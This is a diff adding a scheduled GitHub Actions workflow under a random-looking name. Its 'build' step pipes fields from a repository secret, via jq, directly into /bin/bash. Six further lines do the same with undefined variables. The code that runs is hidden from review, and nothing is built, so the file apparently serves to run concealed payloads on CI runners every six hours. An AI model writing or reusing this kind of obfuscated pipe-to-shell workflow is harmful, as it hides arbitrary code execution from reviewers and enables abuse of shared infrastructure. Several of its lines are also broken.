@@ -1,0 +1,23 @@
+name: shanxiaochen8371
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shanxiaochen8371
+        env:
+          ek4: ${{ secrets.ek4 }}
+        run: |
+          echo $ek4 | jq -r .vets2432 | /bin/bash
+          echo $eyuo200 | jq -r .ra5 | /bin/bash
+          echo $uxo08 | jq -r .r795 | /bin/bash
+          echo $q29 | jq -r .yf91687 | /bin/bash
+          echo $sb0 | jq -r .nkh166 | /bin/bash
+          echo $d399 | jq -r .tqwl1930 | /bin/bash
+          echo $kby21327 | jq -r .ie2 | /bin/bash
+
